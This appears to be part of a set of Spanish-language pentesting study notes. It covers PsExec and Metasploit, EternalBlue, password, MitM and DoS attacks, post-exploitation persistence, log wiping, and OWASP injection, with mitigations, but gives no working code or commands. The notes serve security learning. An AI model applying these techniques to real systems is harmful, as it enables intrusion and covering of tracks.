+
+<p> NOTA: la utilidada PsExec es una utilidad de Windows, Sin embargo es posible ejecutar en un sistema Linux por medio de herramientas o un script de Python llamado <b>psexec.py</b></p>
+
+
+<p>script de Python que implementa una funcionalidad similar a la herramienta original de Windows, PsExec (parte de la suite Sysinternals), pero diseñada para trabajar en entornos de red de manera más flexible y automatizada, comúnmente utilizada en tareas de administración de sistemas y en pruebas de penetración (pentesting).</p>
+
+
+<p>Tecnica </p>
+
+<p> • Utilizar psexec.py </p>
+
+
+<p>Proporcionar el nombre de usuario seguido de la direccion IP de destino y luego proporcionar el ejecutable real o el comando que se quiera ejecutar a continuacion solicitara la contraseña del usuario  </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/qR1jtFJB/328.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> • Utilizar Metasploit </p>
+
+
+<p> Modulo <b>exploit/windows/smb/psexec</b> Este módulo utiliza un nombre de usuario y una contraseña de administrador válidos (o un hash de contraseña) para ejecutar una carga útil arbitraria. Este módulo es similar a la utilidad «psexec» proporcionada por SysInternals. Ahora, este módulo es capaz de borrar sus propios rastros. El servicio creado por esta herramienta utiliza un nombre y una descripción elegidos al azar.</p>
+
+
+<p> Configurar los parametros, para establecer la sesion Merterpreter </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/SRfhBkqt/331.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<h2> :white_check_mark: EternalBlue - CVE-2017-0144</h2> 
+
+
+<h3> SMB </h3> 
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/q72dWRQq/Eternal-Blue-2.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p> EternalBlue (MS17-010) es una de las vulnerabilidades más críticas en la historia de Microsoft.</p>
+
+
+<p> Cualquier cosa que use el protocolo de intercambio de archivos <b>SMBv1</b> (Server Message Block versión 1) está técnicamente en riesgo de ser objetivo de ransomware y otros ciberataques. EternalBlue aprovecha las vulnerabilidades de SMBv1 para insertar paquetes de datos maliciosos y propagar el malware por la red.</p>
+
+<p> La vulnerabilidad es un desbordamiento de búfer en el protocolo SMBv1 (Server Message Block version 1). Específicamente, el error reside en el manejo de paquetes Trans2 Secondary Data Payload en srv2.sys (controlador del servidor SMB). Un atacante puede enviar un paquete SMB especialmente diseñado que provoca una corrupción de memoria, permitiendo la ejecución remota de código a nivel de kernel.</p>
+
+
+
+
+
+
+<!--------------------------------------------------##  Tipos de ataque de COntraseña --------------------------------------------------------------------------->
+
+
+
+<h2> :arrow_right:  Ataques de contraseñas </h2>
+
+
+<p> Tipos de ataque </p>
+
+
+<p> :radio_button: <b> Ataques de Diccionario </b>  es una técnica de fuerza bruta que utiliza una lista predefinida de palabras (diccionario) para intentar adivinar contraseñas. Es más eficiente que la fuerza bruta tradicional porque se enfoca en combinaciones probables.  </p>
+<p> :radio_button: <b> Ataque de Fuerza bruta</b> Un ataque de fuerza bruta es una técnica que prueba todas las posibles combinaciones de contraseñas hasta encontrar la correcta. Es más lento pero garantiza encontrar la contraseña si se prueba todo el espacio de búsqueda. </p>
+<p> :radio_button: <b> credential stuffing </b> es una técnica donde se reutilizan credenciales comprometidas (por ejemplo, de un data breach) en múltiples servicios para obtener acceso no autorizado. Se basa en la tendencia de usuarios a reutilizar contraseñas. </p>
+<p> :radio_button: <b> Password Spraying </b> es una técnica que prueba una sola contraseña contra múltiples cuentas, en lugar de intentar varias contraseñas en una sola cuenta. Es útil para evitar bloqueos de cuentas por demasiados intentos fallidos. </p>
+<p> :radio_button: <b> taques híbridos </b> combinan técnicas de fuerza bruta y diccionario para aumentar la eficacia de los ataques de contraseña. Se utilizan cuando las contraseñas siguen patrones comunes (ej: password123 o admin123). </p>
+
+
+<p> Listas de palabras mas usadas </p>
+
+<p> La elección de la lista de palabras debe depender de su conocimiento del objetivo </p>
+
+
+<p> :radio_button: <b> RockYou </b> lista de contraseñas violadas </p>
+<p> :radio_button: <b> SecLists </b> colección de múltiples listas de palabras para diferentes propósitos </p>
+<p> :radio_button: <b> CrackStation </b> proporciona listas de palabras optimizadas para descifrar contraseñas. </p>
+<p> :radio_button: <b> Breach compilations  </b> contienen miles de millones de contraseñas reales de diversas violaciones de datos </p>
+
+
+<h3> :arrow_right: Herramientas de ataque de contraseñas </h3>
+
+
+<p> :radio_button: <b> THC Hydra </b> es una herramienta de fuerza bruta multi-protocolo, usada para realizar ataques de fuerza bruta contra múltiples protocolos (FTP, POP3, IMAP, SMTP, SSH y todos los métodos relacionados con HTTP). </p>
+<p> :radio_button: <b> Medusa </b> es similar a Hydra pero con un diseño modular. Algunos lo encuentran más estable para ciertos protocolos.. </p>
+<p> :radio_button: <b> Ncrack</b> Ncrack es una herramienta de fuerza bruta multi-protocolo desarrollada por Nmap, diseñada para acelerar los ataques de fuerza bruta en entornos de red. </p>
+<p> :radio_button: <b> CrackMapExec (CME)/NetExec </b> es una herramienta de pentesting que permite realizar ataques de credenciales contra múltiples protocolos (SMB, LDAP, Kerberos, etc.) y sistemas Windows. </p>
+<p> :radio_button: <b> Burp Suite intruder </b> es una herramienta de pentesting que permite realizar ataques de fuerza bruta, diccionario y híbridos contra aplicaciones web.. </p>
+<p> :radio_button: <b> Hashcat</b> Es una herramienta de cracking de hashes desarrollada por Openwall, usada para crackear hashes de contraseñas en múltiples formatos (MD5, SHA1, NTLM, etc.).. </p>
+<p> :radio_button: <b> John the Ripper  </b> es una herramienta de cracking de hashes desarrollada por Openwall, usada para crackear hashes de contraseñas en múltiples formatos (MD5, SHA1, NTLM, etc.). </p>
+
+
+
+<p>Mitigación de ataques con contraseña
+La mitigación contra ataques de contraseñas depende del sistema de destino. Las defensas modernas incluyen:
+
+Las políticas de contraseñas imponen restricciones de complejidad mínima. Orientación moderna como NIST SP 800-63B (un EE. UU. El estándar gubernamental para las pautas de identidad digital) recomienda centrarse en la longitud de la contraseña en lugar de las reglas de complejidad, bloquear las contraseñas comprometidas conocidas y no requerir cambios regulares de contraseña a menos que haya evidencia de compromiso.
+
+El bloqueo de cuenta bloquea temporal o permanentemente una cuenta después de una cierta cantidad de intentos fallidos. Esto es eficaz contra la fuerza bruta, pero puede evitarse mediante la pulverización de contraseñas o abusarse de él para denegar el servicio.
+
+La limitación de velocidad y el bloqueo retrasan las respuestas a los intentos de inicio de sesión. Unos pocos segundos de retraso son tolerables para los usuarios legítimos, pero obstaculizan gravemente las herramientas automatizadas. Las implementaciones más sofisticadas utilizan un retroceso exponencial.
+
+CAPTCHA requiere resolver un desafío difícil para las máquinas. Los CAPTCHA modernos utilizan análisis de comportamiento y puntuación de riesgos en lugar de simplemente reconocimiento de imágenes.
+
+Autenticación multifactor (Ministerio de Relaciones Exteriores) requiere verificación adicional más allá de la contraseña, como un código de una aplicación de autenticación, SMS (aunque los SMS son menos seguros) o una clave de seguridad de hardware. MFA es una de las defensas más efectivas contra los ataques de contraseñas.
+
+La autenticación sin contraseña elimina las contraseñas por completo utilizando métodos como:
+
+Las claves de acceso (FIDO2/WebAuthn) utilizan claves criptográficas almacenadas en dispositivos, reemplazando las contraseñas con verificación biométrica o PIN.
+Enlaces mágicos enviados por correo electrónico.
+Claves de seguridad de hardware como YubiKeys.
+La detección de contraseñas violadas verifica las contraseñas con bases de datos de violaciones conocidas durante el registro y el inicio de sesión. Servicios como "Have I Been Pwned" proporcionan API para este propósito.
+
+El análisis del comportamiento detecta anomalías como intentos de inicio de sesión desde ubicaciones inusuales, escenarios de viaje imposibles o patrones consistentes con ataques automatizados.
+
+Controles basados en IP que incluyen geofencing y bloqueo de dispositivos maliciosos conocidos IP, y requerir verificación adicional para nuevos dispositivos o ubicaciones.
+
+El uso de una combinación de los enfoques anteriores proporciona una defensa profunda contra ataques de contraseñas. Para entornos de alta seguridad, avanzar hacia la autenticación sin contraseña elimina por completo muchos de estos vectores de ataque.</p>
+
+
+
+
+
+<!--------------------------------------------------##  Ataques basados en red  --------------------------------------------------------------------------->
+
+<!--------------------------------------------------##  MitM  --------------------------------------------------------------------------->
+
+
+<h2> :arrow_right:  Ataques basados en red </h2>
+
+
+
+
+<h2>:white_check_mark:  Ataques Man-in-the-Middle (MitM)</h2> 
+
+
+
+
+<p> Un ataque MITM ocurre cuando un atacante se interpone entre dos partes comunicándose, interceptando y potencialmente modificando la comunicación. El objetivo es robar información sensible (credenciales, tokens, etc.) o alterar los datos transmitidos. </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/3xghnVqC/MITM.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+<p> Este ataque es relativamente sencillo de llevar a cabo si las dos partes no confirman la autenticidad e integridad de cada mensaje. En algunos casos, el protocolo elegido no proporciona autenticación segura o integridad. Algunos protocolos tienen inseguridades inherentes que los hacen susceptibles a este tipo de ataques. </p>
+
+
+
+
+<h3> &nbsp; Técnicas (MiTM) </h3>
+
+<p><b>:radio_button:   Suplantación de DHCP :</b> envío de respuestas DHCP falsas para redirigir el tráfico de red.</p>
+<p><b>:radio_button:   Ataque gemelo malvado :</b> configuración de un punto de acceso Wi-Fi falso para interceptar el tráfico a través del sistema del atacante.</p>
+<p><b>:radio_button:   Envenenamiento de caché ARP :</b> envío de mensajes ARP falsos para vincular su dirección MAC con la dirección IP de otro host.</p>
+<p><b>:radio_button:   Envenenamiento LLMNR/NBT-NS :</b> explotación de protocolos de red para interceptar y retransmitir tráfico de autenticación.</p>
+<p><b>:radio_button:   Suplantacion DNS/ DNS Spoofing  </b>  implica proporcionar información falsa respuestas DNS para redirigir a las víctimas a servidores controlados por el atacante. Esto puede suceder a través de un compromiso de servidores DNS, envenenamiento de caché, o respondiendo a consultas DNS más rápidas que el servidor legítimo.</p>
+<p><b>:radio_button:   BGP Hijacking </b>   a nivel de enrutamiento de Internet, donde los atacantes anuncian rutas BGP falsas para redirigir el tráfico a través de su infraestructura. Se trata de un ataque más sofisticado, normalmente dirigido a organizaciones o regiones específicas.</p>
+
+
+
+<p> Una vez que nos hemos posicionado en el medio, podemos empezar a rastrear el tráfico en busca de información confidencial. Si el tráfico está cifrado, podemos emplear técnicas como: </p>
+
+<p><b>:radio_button:  Debilitar el cifrado :</b> comprometer las capacidades de cifrado de un dispositivo de red</p>
+<p><b>:radio_button:  Certificados falsos :</b> implican que el atacante presente su propio certificado y establezca conexiones cifradas separadas con ambas partes. Esto funciona si la víctima acepta una advertencia de certificado no válido o si el atacante ha comprometido una autoridad de certificación (CA).</p>
+<p><b>:radio_button:  Ataque de degradación / SSL Stripping  </b> aprovecha la compatibilidad con versiones anteriores de un sistema para obligarlo a utilizar una versión menos segura.</p>
+
+
+<h3> &nbsp; Herramientas para ataques MITM </h3>
+
+</br>
+
+<p><b> :radio_button: SSLstrip+ :</b> Realizar ataques de degradación de HTTPS a HTTP.</p>
+<p><b> :radio_button: Bettercap :</b> es el sucesor moderno de Ettercap. Admite suplantación de ARP, suplantación de DNS, proxy HTTP/HTTPS y tiene una arquitectura modular para varios escenarios de ataque.</p>
+<p><b> :radio_button: Ettercap :</b> es una herramienta clásica para ataques MITM en LAN. </p>
+<p><b> :radio_button: Cain y abel :</b> </p>
+<p><b> :radio_button: Mitmframwork :</b> Envenenar consultas LLMNR, NBT-NS y mDNS</p>
+<p><b> :radio_button: mitmproxy :</b> proxy HTTPS interactivo que permite la inspección y modificación del tráfico. Es particularmente útil para analizar y manipular comunicaciones HTTP/HTTPS.</p>
+<p><b> :radio_button: Arpspoof :</b> Ataques de envenenamiento de caché ARP.</p>
+<p><b> :radio_button: Aircrack-ng :</b> Conjunto de herramientas para atacar redes Wi-Fi.</p>
+<p><b> :radio_button: Airgeddon :</b> Framework para atacar redes WiFi. Incluye ataques de gemelo malvado.</p>
+<p><b> :radio_button: Fluxion :</b> Ataques MiTM contra redes Wi-Fi.</p>
+
+
+
+<p> MITM puede afectar a otros protocolos de texto claro como FTP, SMTP, y POP3. La mitigación fundamental requiere el uso de criptografía. La solución radica en una autenticación adecuada junto con el cifrado o la firma de los mensajes intercambiados. Con la ayuda de la Infraestructura de Clave Pública (PKI) y certificados raíz confiables, seguridad de la capa de transporte (TLS) protege contra MITMataques cuando se implementan correctamente..</p>
+
+
+<h3> &nbsp; Técnicas de mitigación </h3>
+
+
+<p><b> :radio_button: Validación de certificados :</b> Verificar que el certificado sea válido antes de conectar</p>
+<p><b> :radio_button: DHCP Snooping </b> Evita IPs falsas en la red local.</p>
+<p><b> :radio_button: TLS Pinning :</b> Fija el certificado esperado para evitar impersonación</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p> </p>
+<p> Tecnicas</p>
+<p><b> • Descifrado de contraseñas:</b> </p>
+
+
+  <p><b> &nbsp; Ataques no electronicos:</b> </p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Ingenieria social </b> </p>
+ 
+<p><b> &nbsp;&nbsp;🛠 &nbsp; Setoolkit</p>
+<p><b> &nbsp;&nbsp;🛠 &nbsp; BeEF</p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Espiar la contraseña </b> </p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Buscar en la basura</b> </p>
+
+  <p><b> &nbsp; Ataques activos en linea:</b> </p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Contraseñas por defecto </b> </p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Password Cracking  </b> </p>
+
+
+<p><b> Intentar explotar las posibles debilidades de contraseñas asignadas en el servidor web </b> </p>
+<p> Objetivos del ataque</p>
+
+<p> Servidores de SMTP y FTP</p>
+<p> Tunelkes SSH</p>
+<p> Formularios de autenticacion web</p>
+
+<p> Tecnicas</p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Ataque de fuerza bruta </b> </p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Ataque de diccionario </b> </p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Ataque de tabla arcoiris </b> </p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Uso de Troyanos, Spyware, Keyloggers </b> </p>
+
+
+
+
+
+
+
+
+
+
+ <p><b> &nbsp; Ataques pasivos en linea::</b> </p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Ataque de tabla de arcoiris, tecnica de criptoanalitica almacenada en memoria</b> </p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Ataque de red distribuido</b> </p>
+
+
+
+<p><b> • Explotacion de desbordamiento de Bufer:</b> </p>
+
+
+  <p><b> &nbsp; Vulnerabilidad de las aplicaciones de Bufer:</b> </p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Inyectar codigo malicioso en el bufer para dañar archivos </b> </p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Modificar datos del program</b> </p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Acceder a informacion critica </b> </p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Obtener acceso al Shell </b> </p>
+
+
+
+
+<p><b> • Explotacion de vulnerabilidades :</b> </p>
+
+  <p><b> &nbsp; Determinar la capacidad de la vulnerabilidad </b> </p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Desarrollar el exploit </b> </p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Seleccionar el metodo de entrega (Local o remoto)</b> </p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Generar y entregar el payload </b> </p>
+    <p><b> &nbsp;&nbsp;🛠 &nbsp;&nbsp; Obtener acceso al Shell remoto </b> </p>
+
+
+
+
+<p> Paso 2:  &nbsp; Elevar privilegios - Privilege Escalation &nbsp; TA0004 </p>
+
+<p> Tipos</p>
+
+<p><b> Horizontal</b> &nbsp; Acceder a recursos, funciones y otros privilegios que pertenecen a un usuario autorizado con un permiso de acceso similar </p>
+<p><b> Vertical </b> &nbsp; Acceder a los recursos y funciones de un usuario con privilegios superiores </p>
+
+
+<p> Tecnicas</p>
+
+<p><b> • Explotacion de vulnerabilidades </b> &nbsp; para obtener mayores privilegios </p>
+
+<p><b> • Secuestro de DLLs</b></p>
+  <p><b> &nbsp; Reemplazar Dlls legitimas por maliciosas</b> &nbsp; Powersploit puede identificar los DLLs secuentrables y ejecutar el cambio en el sistema</p>
+
+<p><b> • Ataques a vulnerabilidades spectre y meltdown </b> &nbsp;"Procesadores AMD - ARM - INTEL" </p>
+
+<p><b> • Explotacion de servicios mal configurados:</b> </p>
+  <p><b> &nbsp; Identificar servicios mal configurados </b> &nbsp; Powersploit </p>
+
+ 
+
+
+<p> Paso 3:  &nbsp; Mantener altos niveles de acceso - Persistencia &nbsp; TA0003 </p>
+
+<p> 1.&nbsp; Ejecutar remotamente aplicaciones maliciosas para robar informacion critica </p>
+    <p><b> &nbsp;&nbsp;🛠 Backdoors &nbsp;&nbsp; Denegar o interrumpir la operacion, tomando informacion para la perdida de privacidad y obtener acceso no autorizado a los recursos del sistema </b> </p>
+    <p><b> &nbsp;&nbsp;🛠 Crackers &nbsp;&nbsp; Software diseñado para decifrar un codigo o contraseña </b> </p>
+    <p><b> &nbsp;&nbsp;🛠 Keyloggers &nbsp;&nbsp; Grabar las pulsaciones del teclados </b> </p>
+    <p><b> &nbsp;&nbsp;🛠 Spyware &nbsp;&nbsp; Tomar captura de la pantalla y enviarlas a un destino definido </b> </p>
+
+
+
+<p> 2.&nbsp; Esconder los programas o archivos maliciosos</p>
+    <p><b> &nbsp;🛠 Rootkits &nbsp;&nbsp; Malware sofisticado diseñado específicamente para ocultar su presencia en un sistema mientras otorga acceso privilegiado a atacantes no autorizados </b> </p>
+        <p>&nbsp;&nbsp;🛠 • Lojas </p>
+        <p>&nbsp;&nbsp;🛠 • Scranos </p>
+        <p>&nbsp;&nbsp;🛠 • Horse pill </p>
+        <p>&nbsp;&nbsp;🛠 • Necurs </p>
+    <p><b> &nbsp;🛠 Streams de datos NTFS &nbsp;&nbsp; Permite al atacante ocultar codigo malicioso</b> </p>
+    <p><b> &nbsp;🛠 Esteganografia &nbsp;&nbsp; Ocultar informacion detras de otros datos sin el consentimiento de la victima </b> </p>
+  
+
+
+<p> Paso 4:  &nbsp; Limpiar el rastro - Defense Evasion  &nbsp; TA0005 </p>
+
+<p><b> &nbsp; • Desactivar la auditoria del sistema</b> </p>
+<p><b> &nbsp; • Borrar los registros del sistema</b> </p>
+<p><b> &nbsp; • Manipular los registros del sistema</b> </p>
+<p><b> &nbsp; • Cubrir las huellas en la red</b> </p>
+<p><b> &nbsp; • Borrados de archivos </b> </p>
+
+
+<p>&nbsp;&nbsp; Herramientas </p>
+        <p>&nbsp;&nbsp;🛠 • CCleaner </p>
+        <p>&nbsp;&nbsp;🛠 • DBAN &nbsp; Es una herramienta para para aplicar un borrado seguro a cualquier disco, HDD o SSD. </p>
+        <p>&nbsp;&nbsp;🛠 • Privacy Eraser </p>
+        <p>&nbsp;&nbsp;🛠 • Wipe </p>
+        <p>&nbsp;&nbsp;🛠 • ClearProg </p>
+
+
+
+p>&nbsp;&nbsp;<h3>Ataques a servidores WEB<h3></p>
+
+  <p> Daños dentro de la origanizacion</p>
+
+<p><b> &nbsp; • Comprometer cuentas de usuario</b> </p>
+<p><b> &nbsp; • Realizar cambios en el contenido del sitio web</b> </p>
+<p><b> &nbsp; • Realizar ataques secundarios desde el servidor web</b> </p>
+<p><b> &nbsp; • Acceder como administrador a otras aplicaciones o al servidor </b> </p>
+<p><b> &nbsp; • Manipular los datos de la organizacion para comprometer a los usuarios que se conecten al servidor</b> </p>
+<p><b> &nbsp; • Robar datos sensibles de la origanizacion </b> </p>
+
+<p> Riesgos </p>
+
+<p><b> &nbsp; • Establecer permisos inadecuados de archivos y directorios </b> </p>
+<p><b> &nbsp; • Realizar la instalacion del servidor con la configuracion por defecto </b> </p>
+<p><b> &nbsp; • Dejar habilitados servicios innecesarios </b> </p>
+<p><b> &nbsp; • Problemas con la configuracion de cuentas con contraseñas por defecto </b> </p>
+<p><b> &nbsp; • Configuraciones erroneas en el servidor web el sistema operaativo o las redes </b> </p>
+<p><b> &nbsp; • Fallos en el software del servidor, sistema operativo o aplicaciones web </b> </p>
+<p><b> &nbsp; • Problemsa con los certificaados </b> </p>
+
+<p>Recopilar informacion</p>
+
+<p><b> &nbsp; • Whois </b> </p>
+  <p>&nbsp;&nbsp;🛠 https://www.whois.com </p>
+  <p>&nbsp;&nbsp;🛠 https://whois.domaintools.com </p>
+
+<p><b> &nbsp; • Dosier del dominio </b> </p>
+  <p>&nbsp;&nbsp;🛠 https://centralops.net/co </p>
+
+<p><b> &nbsp; • Encontrar subdominios </b> </p>
+<p>&nbsp;&nbsp;🛠 https://pentest-tools.com/information-gathering/find-subdomains-of-domain </p>
+
+<p><b> &nbsp; • Robots.txt </b> Este archivo es para evitar el rastreo y la indexación de ciertas partes de tu sitio por rastreadores web y arañas administrados por sitios como Yahoo! y Google.</p>
+  <p>&nbsp;&nbsp;🛠 URL/robots.txt o https://seranking.com/free-tools/robots-txt-tester.html</p>
+
+<p><b> &nbsp; • Captura de Banners</b> </p>
+  <p>&nbsp;&nbsp;🛠 Netcraft</p>
+  <p>&nbsp;&nbsp;🛠 Netcat</p>
+  <p>&nbsp;&nbsp;🛠 Telnet</p>
+  <p>&nbsp;&nbsp;🛠 Httprecon</p>
+  <p>&nbsp;&nbsp;🛠 ID Serve</p>
+  <p>&nbsp;&nbsp;🛠 Nmap</p>
+
+
+<p><b> &nbsp; Explotar vulnerbilidades</b> </p>
+  <p>&nbsp;&nbsp;🛠 Acunetix</p>
+  <p>&nbsp;&nbsp;🛠 Arachni</p>
+  <p>&nbsp;&nbsp;🛠 Burp Suite</p>
+  <p>&nbsp;&nbsp;🛠 Nessus</p>
+  <p>&nbsp;&nbsp;🛠 Nikto</p>
+
+
+<p><b> &nbsp; Vulnerabilidades explotables</b> </p>
+  <p>&nbsp;&nbsp;🛠 Exploit dtabase</p>
+  <p>&nbsp;&nbsp;🛠 Rapid7</p>
+  <p>&nbsp;&nbsp;🛠 Security focus</p>
+  <p>&nbsp;&nbsp;🛠 Nessus</p>
+  <p>&nbsp;&nbsp;🛠 Zero day</p>
+
+
+
+
+<p><b> &nbsp; Ataques mas frecuentes a los servidores WEB</b> </p>
+
+
+### &nbsp;  Ataques de denegación de servicio (DoS y DDoS)
+
+</b> 
+
+<p>Saturar una red o un servicio con tráfico excesivo para que no esté disponible para usuarios legítimos.La mayoría de los ataques DoS implican inundación, lo que significa saturar al objetivo con solicitudes. </p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/FzpJHJBF/5.png" alt="Descripción de la imagen">
+</p>
+
+### 👨🏻‍💻 &nbsp;Tipos
+
+###  Basado en volumen
+
+<p> Saturar el ancho de banda del sitio, medido en bps (bits por segundo), atacando las capas inferiores del modelo TCP/IP. </p>
+
+<p><b> • Inundaciones ICMP :</b> envío de muchos pings.</p>
+<p><b> • Inundaciones UDP :</b> envío de una gran cantidad de datos UDP.</p>
+<p><b> • Red de botnet :</b> Un botnet es un conjunto de máquinas comprometidas que el atacante puede manipular desde un sistema de comando y control (CnC o C2) para participar en un ataque de DDoS, enviar correos electrónicos no deseados y realizar otras actividades ilícitas.</p>
+
+<p>La Figura muestra cómo un atacante puede utilizar una botnet para lanzar un ataque DDoS. La botnet está compuesta por terminales de usuario comprometidos (computadoras portátiles), enrutadores inalámbricos domésticos y dispositivos de Internet de las cosas (IoT), como cámaras IP. </p>
+
+<p>El atacante envía instrucciones al C2; Posteriormente, el C2 envía instrucciones a los bots dentro de la botnet para lanzar el ataque DDoS contra el servidor víctima.</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/WpWKsLz8/2.png" alt="Descripción de la imagen">
+</p>
+
+###  Basado en protocolo
+
+<p> Consumir recursos del servidor o del nodo de red explotando las asignaciones del protocolo </p>
+
+
+<p><b> • Inundaciones SYN :</b>El atacante lanza un ataque DoS directo envío de muchos paquetes SYN para dejar conexiones TCP medio abiertas y, por lo tanto, exceder los recursos del servidor, impidiendo conexiones de usuarios legítimos.</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/nhjfyV1q/1.png" alt="Descripción de la imagen">
+</p>
+
+<p>Ataques DoS y DDoS reflejados</p>
+
+<p>los atacantes envían a las fuentes paquetes falsos que parecen ser de la víctima y luego las fuentes se vuelven participantes involuntarios en el ataque reflejado al enviar el tráfico de respuesta a la víctima prevista.</p>
+
+<p> el atacante envía un paquete al host A. La dirección IP de origen es la dirección IP de la víctima (10.1.2.3) y la dirección IP de destino es la dirección IP del host A (10.1.1.8). Posteriormente, el host A envía un paquete 
+no deseado a la víctima. Si el atacante continúa enviando este tipo de paquetes, el Host A no solo inunda a la víctima, sino que la víctima también puede responder con paquetes innecesarios, lo que consume ancho de banda y recursos</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/sxH7Z4qQ/3.png" alt="Descripción de la imagen">
+</p>
+
+
+<p><b> • Ataques de paquetes fragmentados : :</b>  envío de muchos paquetes fragmentados innecesariamente para llenar la cola/ventana TCP del objetivo.</p>
+<p><b> • Ataques Smurf :</b> envío de solicitudes ICMP a la dirección de transmisión, lo que hace que todas las máquinas en el dominio de transmisión respondan al objetivo.</p>
+<p><b> • Ataques DDoS de amplificación :</b> es una forma de ataque de DoS reflejado en el que el tráfico de respuesta (enviado por el participante involuntario) está compuesto por paquetes que son mucho más grandes que los enviados inicialmente por el atacante 
+(falsificando a la víctima). Un ejemplo de este tipo de ataque es un atacante que envía consultas de DNS a un servidor DNS abierto. Luego, el servidor DNS responde con un tamaño de paquete mucho mayor que los paquetes de consulta iniciales. 
+El resultado final es que la máquina de la víctima se ve inundada por paquetes grandes para los que nunca emitió consultas</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/xCC4rtvq/4.png" alt="Descripción de la imagen">
+</p>
+
+###  Basado en solicitudes
+
+<p> Se centra en los servicios y aplicaciones de las capas superiores del modelo TCP/IP. Se mide en rps (solicitudes por segundo). </p>
+
+<p><b> • Ataques lentos y de bajo rendimientoP :</b> Ancho de banda bajo, solicitudes lentas para saturar todos los subprocesos de la aplicación.</p>
+<p><b> • Ataques DDoS de amplificación :</b> Solicitudes constantes de contenido que consumen recursos de la aplicación.</p>
+
+
+### 🛠 &nbsp;Herramientas
+
+</br>
+
+
+<p><b> • Low orbit ion cannon </b></p>
+<p><b> • High orbit ion cannon</b></p>
+<p><b> • R-u-dead-yet:</b></p>
+<p><b> • Exploit lanzado desde metasploit</b></p>
+<p><b> • SlowLoris :</b> realiza ataques DoS lentos y de baja intensidad.</p>
+<p><b> • Hping3 :</b> una herramienta para crear y enviar paquetes TCP/UDP personalizados y ver respuestas.</p>
+<p><b> • DHCPig :</b> agota todas las direcciones en el grupo DHCP.</p>
+<p><b> • Yersinia  :</b> Un marco de ataque de capa 2.</p>
+
+
+<p><b>&nbsp;&nbsp;&nbsp;• Secuestro de sesión</b>: Tomar el control de una sesión activa entre dos partes para obtener acceso no autorizado a información o servicios.</p>
+<p><b>&nbsp;&nbsp;&nbsp;• Ataques de repetición</b>: Captura y retransmisión de datos válidos para crear efectos no autorizados u obtener acceso a los sistemas.</p>
+
+
+
+### &nbsp;  Ataques de acceso a directorios del servidor web
+
+
+<p> Acceder a directorios restringidos ejecutando comandos del sistema operativo a traves de la manipulacion de la URL. Utilizando la secuencia (../) y sus variaciones o rutas del archivo absolutas para acceder a los 
+archivos y directorios almacenados en los sistemas de archivos incluyendo el codigo fuente de la aplicacion o la configuracion y los archivos criticos del sistema </p>
+
+
+
+### &nbsp;  Ataques de aplicaciones WEB OWASP
+
+
+<p><b> &nbsp; 10 Riesgos de seguridad criticos en aplicaciones WEB</b> </p>
+
+
+  <p>&nbsp; 1) &nbsp; Inyeccion </p>
+  </br>
+    <p>&nbsp; Se producen cuando se envian datos no fiables a un interprete como parte de un comando o consulta con la finalidad que el interprete ejecute comandos no deseados o acceda a datos sin la debida autorizacion </p>
+    </br>
+      <p><b> 🛠 Inyeccion SQL&nbsp;  </b>La inyección SQL (SQL Injection o SQLi) es una técnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que interactúan con bases de datos. Consiste en insertar o "inyectar" código SQL malicioso en las consultas que realiza una aplicación hacia su base de datos.</p>
+      <p><b> 🛠 Inyeccion de comandos&nbsp;  </b>La inyección de comandos (también conocida como "Command Injection" o "OS Command Injection") es una vulnerabilidad de seguridad en aplicaciones web o sistemas que permite a un atacante ejecutar comandos del sistema operativo directamente en el servidor donde se aloja la aplicación.</p>
+          <p><b>&nbsp;&nbsp;&nbsp; Ataque shell injection: &nbsp;Es una vulnerabilidad crítica que permite a un atacante ejecutar comandos del sistema operativo directamente en el servidor vulnerable. </b>
+          <p><b>&nbsp;&nbsp;&nbsp; HTML embedding &nbsp; Incorporar contenido HTML de una fuente externa dentro de una página web propia </b>:
+          <p><b>&nbsp;&nbsp;&nbsp; Inyeccion de archivos&nbsp; Es una vulnerabilidad web que permite a un atacante incluir e interpretar archivos en una aplicación vulnerable</b>
+      <p><b> 🛠 Inyeccion LDAP&nbsp;  </b> Es una vulnerabilidad de seguridad que ocurre cuando una aplicación construye consultas LDAP utilizando entradas del usuario sin una adecuada sanitización</p      
+
+
+
+  <p>&nbsp; 2) &nbsp; Autenticaciones Rotas </p>
+  </br>
